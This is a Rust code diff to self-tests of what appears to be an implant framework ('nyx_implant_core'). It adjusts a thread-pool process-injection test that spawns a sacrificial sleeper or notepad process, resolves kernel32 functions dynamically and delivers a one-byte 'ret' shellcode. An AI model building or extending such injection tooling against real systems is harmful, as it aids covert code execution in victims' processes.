@@ -618,13 +618,22 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     // RUNNING sacrificial (see the block comment for why a suspended notepad
     // cannot work). The x64 test sleeper is preferred when deployed: under
     // Prism it is a peer x64-emulated target, guaranteed alive, holding a
-    // worker factory; otherwise a running notepad.
-    let proc = match crate::inject::create_sacrificial_running(CRT3_SLEEPER) {
-        Ok(p) => {
-            crate::selftests::write_marker("nyx_g6_inject_pool.target", CRT3_SLEEPER);
-            p
+    // worker factory. If the sleeper file is on disk, notepad fallback is
+    // forbidden — that hid "sleeper present but CreateProcess failed".
+    let proc = if sleeper_on_disk() {
+        match crate::inject::create_sacrificial_running(CRT3_SLEEPER) {
+            Ok(p) => {
+                crate::selftests::write_marker("nyx_g6_inject_pool.target", CRT3_SLEEPER);
+                p
+            }
+            Err(e) => {
+                crate::selftests::write_marker("nyx_g6_inject_pool.target", e);
+                crate::tp::set_pool_party_enabled(prev_gate);
+                unsafe { exit(mask) };
+            }
         }
-        Err(_) => match crate::inject::create_sacrificial_running("notepad.exe") {
+    } else {
+        match crate::inject::create_sacrificial_running("notepad.exe") {
             Ok(p) => {
                 crate::selftests::write_marker("nyx_g6_inject_pool.target", "notepad.exe");
                 p
@@ -633,7 +642,7 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
                 crate::tp::set_pool_party_enabled(prev_gate);
                 unsafe { exit(mask) };
             }
-        },
+        }
     };
     mask |= 1 << 0; // create_sacrificial_running Ok (reached the inject path)
 
@@ -647,7 +656,7 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     // evidence 2026-08-24: "hijack: target has no worker-factory handle").
     if let Some(slp) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"Sleep") {
         let sleep: unsafe extern "system" fn(u32) = unsafe { core::mem::transmute(slp) };
-        unsafe { sleep(2_000) };
+        unsafe { sleep(4_000) };
     }
 
     // Minimal shellcode: `ret` (0xC3). We're verifying the section delivery
@@ -1521,6 +1530,26 @@ pub unsafe extern "system" fn nyx_selftest_crt_probe2() {
 /// Path of the plain-x64 test sleeper on the VM (deployed with the test DLL).
 #[cfg(feature = "selftest")]
 const CRT3_SLEEPER: &str = "C:\\nyx_test\\nyx_x64_sleeper.exe";
+
+/// True when CI deployed [`CRT3_SLEEPER`]. Used to forbid notepad fallback
+/// so a present-but-unspawnable sleeper cannot look like "no worker factory".
+#[cfg(feature = "selftest")]
+fn sleeper_on_disk() -> bool {
+    type GetFileAttributesW = unsafe extern "system" fn(*const u16) -> u32;
+    let Some(addr) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetFileAttributesW")
+    else {
+        return false;
+    };
+    let get: GetFileAttributesW = unsafe { core::mem::transmute(addr) };
+    let mut w = [0u16; 48];
+    for (i, b) in CRT3_SLEEPER.as_bytes().iter().enumerate() {
+        if i + 1 >= w.len() {
+            return false;
+        }
+        w[i] = *b as u16;
+    }
+    unsafe { get(w.as_ptr()) != 0xFFFF_FFFF }
+}
 
 #[cfg(feature = "selftest")]
 #[no_mangle]
